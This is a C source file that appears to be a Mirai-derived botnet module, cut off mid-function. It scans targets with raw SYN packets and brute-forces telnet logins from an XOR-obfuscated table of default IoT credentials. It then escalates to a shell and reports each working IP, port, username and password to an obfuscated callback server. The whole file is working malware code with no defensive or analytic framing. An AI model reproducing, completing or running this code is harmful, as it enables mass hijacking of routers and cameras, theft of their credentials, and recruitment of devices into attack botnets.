#define _GNU_SOURCE

#define SCANNER_RDBUF_SIZE 256
#define SCANNER_HACK_DRAIN 64

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"
#include "attack.h"

struct scanner_endpoint
{
    ipv4_t dst_addr;
    uint16_t dst_port;
};

struct scanner_auth
{
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};

struct scanner_connection
{
    struct scanner_auth *auth;
    int fd, last_recv;
    enum
    {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

static ipv4_t target_ip;
static uint16_t target_port;
static int rsck, rsck_out, auth_table_len = 0;
static char scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
static struct scanner_auth *auth_table = NULL;
static struct scanner_connection *conn;
static uint16_t auth_table_max_weight = 0;
static uint32_t fake_time = 0;

static int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for (i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[auth attack] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
            iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof(struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
    table_unlock_val(TABLE_SCAN_CB_PORT);

    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[report] Failed to resolve report address\n");
#endif
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
    resolv_entries_free(entries);

    table_lock_val(TABLE_SCAN_CB_DOMAIN);
    table_lock_val(TABLE_SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof(uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

void setup_auth(void)
{
    // Set up passwords
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                                        // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                                             // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                                             // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                                         // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                                         // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                                     // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                                     // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);                                 // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                                         // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                                             // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);                         // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                                                 // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);                             // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                                                 // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                                             // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                                                 // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                                             // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                                                 // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);                         // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                                                 // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);                             // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                                             // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                                         // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);                                 // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                                                 // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                                         // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1);     // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);                         // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                                         // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                                         // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                                         // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                         // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1);             // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);                                 // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);                                 // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                                                 // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                                     // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                                         // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                                         // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                                             // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                                                 // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                                             // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1);                 // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);                 // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                                         // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                                                 // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);                                 // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                                                 // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                                     // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);                                 // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);                                 // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                                             // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                                         // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                                         // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                                     // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);             // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                                             // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                                             // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                                     // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                                                 // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);                                 // mother   fucker
}

void attack_auth_auth_start(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    setup_auth();

#ifdef DEBUG
    printf("[auth attack] Scanner process initialized. Scanning started.\n");
#endif

    // init conn
    conn->state = SC_CLOSED;
    conn->fd = -1;

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[auth attack] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
#ifdef DEBUG
        printf("[auth attack] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    } while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // start loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct timeval tim;
        int last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
        if (conn->state == SC_CLOSED)
        {
            // Spew out SYN to try and get a response
            if (fake_time != last_spew)
            {
                last_spew = fake_time;

                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = target_port;
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof(scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            while (TRUE)
            {
                int n;
                char dgram[1514];
                struct iphdr *iph = (struct iphdr *)dgram;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                errno = 0;
                n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
                if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                    break;
                printf("%s\n", (char *)(tcph + 1));
                if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                    continue;
                if (iph->daddr != LOCAL_ADDR)
                    continue;
                if (iph->protocol != IPPROTO_TCP)
                    continue;
                if (tcph->source != target_port)
                    continue;
                if (tcph->dest != source_port)
                    continue;
                if (!tcph->syn)
                    continue;
                if (!tcph->ack)
                    continue;
                if (tcph->rst)
                    continue;
                if (tcph->fin)
                    continue;
                if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                    continue;

                conn->dst_addr = iph->saddr;
                conn->dst_port = tcph->source;
                // target responded
                setup_connection(conn);
#ifdef DEBUG
                printf("[auth attack] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif

                break;
            }
        }
        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        do
        {
            int timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[auth attack] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[auth attack] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr); // can write
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd); // can read
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        } while (FALSE);

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (conn->fd == -1 || nfds <= 0)
            continue;

        if (FD_ISSET(conn->fd, &fdset_wr))
        {
            int err = 0, ret = 0;
            socklen_t err_len = sizeof(err);

            ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if (err == 0 && ret == 0)
            {
                conn->state = SC_HANDLE_IACS;
                conn->auth = random_auth_entry(); // can write
                conn->rdbuf_pos = 0;
#ifdef DEBUG
                printf("[auth attack] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
            }
            else
            {
#ifdef DEBUG
                printf("[auth attack] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                close(conn->fd);
                conn->fd = -1;
                conn->tries = 0;
                conn->state = SC_CLOSED;
                continue;
            }
        }

        if (FD_ISSET(conn->fd, &fdset_rd))
        {
            while (TRUE)
            {
                int ret;

                if (conn->state == SC_CLOSED)
                    break;

                if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                {
                    memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                    conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                }
                errno = 0;
                ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                if (ret == 0)
                {
#ifdef DEBUG
                    printf("[auth attack] FD%d connection gracefully closed\n", conn->fd);
#endif
                    errno = ECONNRESET;
                    ret = -1; // Fall through to closing connection below
                }
                if (ret == -1)
                {
                    if (errno != EAGAIN && errno != EWOULDBLOCK)
                    {
#ifdef DEBUG
                        printf("[auth attack] FD%d lost connection\n", conn->fd);
#endif
                        close(conn->fd);
                        conn->fd = -1;

                        // Retry
                        if (++(conn->tries) >= 10)
                        {
                            conn->tries = 0;
                            conn->state = SC_CLOSED;
                        }
                        else
                        {
                            setup_connection(conn);
#ifdef DEBUG
                            printf("[auth attack] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                        }
                    }
                    break;
                }
                conn->rdbuf_pos += ret;
                conn->last_recv = fake_time;

#ifdef DEBUG
                printf("[auth attack] FD%d ready to brute force fsm!\n", conn->fd);
#endif

                while (TRUE) // fsm
                {
                    int consumed = 0;

                    switch (conn->state)
                    {
                    case SC_HANDLE_IACS:
                        if ((consumed = consume_iacs(conn)) > 0)
                        {
                            conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                            printf("[auth attack] FD%d finished telnet negotiation\n", conn->fd);
#endif
                        }
                        break;
                    case SC_WAITING_USERNAME:
                        if ((consumed = consume_user_prompt(conn)) > 0)
                        {
                            send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                            printf("[auth attack] FD%d received username prompt\n", conn->fd);
#endif
                        }
                        break;
                    case SC_WAITING_PASSWORD:
                        if ((consumed = consume_pass_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            printf("[auth attack] FD%d received password prompt\n", conn->fd);
#endif

                            // Send password
                            send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_PASSWD_RESP;
                        }
                        break;
                    case SC_WAITING_PASSWD_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
                            char *tmp_str;
                            int tmp_len;

#ifdef DEBUG
                            printf("[auth attack] FD%d received shell prompt\n", conn->fd);
#endif

                            // Send enable / system / shell / sh to session to drop into shell if needed
                            table_unlock_val(TABLE_SCAN_ENABLE);
                            tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            table_lock_val(TABLE_SCAN_ENABLE);
                            conn->state = SC_WAITING_ENABLE_RESP;
                        }
                        break;
                    case SC_WAITING_ENABLE_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
                            char *tmp_str;
                            int tmp_len;

#ifdef DEBUG
                            printf("[auth attack] FD%d received sh prompt\n", conn->fd);
#endif

                            table_unlock_val(TABLE_SCAN_SYSTEM);
                            tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            table_lock_val(TABLE_SCAN_SYSTEM);

                            conn->state = SC_WAITING_SYSTEM_RESP;
                        }
                        break;
                    case SC_WAITING_SYSTEM_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
                            char *tmp_str;
                            int tmp_len;

#ifdef DEBUG
                            printf("[auth attack] FD%d received sh prompt\n", conn->fd);
#endif

                            table_unlock_val(TABLE_SCAN_SHELL);
                            tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            table_lock_val(TABLE_SCAN_SHELL);

                            conn->state = SC_WAITING_SHELL_RESP;
                        }
                        break;
                    case SC_WAITING_SHELL_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
                            char *tmp_str;
                            int tmp_len;

#ifdef DEBUG
                            printf("[auth attack] FD%d received enable prompt\n", conn->fd);
#endif

                            table_unlock_val(TABLE_SCAN_SH);
                            tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            table_lock_val(TABLE_SCAN_SH);

                            conn->state = SC_WAITING_SH_RESP;
                        }
                        break;
                    case SC_WAITING_SH_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
                            char *tmp_str;
                            int tmp_len;

#ifdef DEBUG
                            printf("[auth attack] FD%d received sh prompt\n", conn->fd);
#endif

                            // Send query string
                            table_unlock_val(TABLE_SCAN_QUERY);
                            tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            table_lock_val(TABLE_SCAN_QUERY);

                            conn->state = SC_WAITING_TOKEN_RESP;
                        }
                        break;
                    case SC_WAITING_TOKEN_RESP:
                        consumed = consume_resp_prompt(conn);
                        if (consumed == -1)
                        {
#ifdef DEBUG
                            printf("[auth attack] FD%d invalid username/password combo\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) == 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[auth attack] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        else if (consumed > 0)
                        {
                            char *tmp_str;
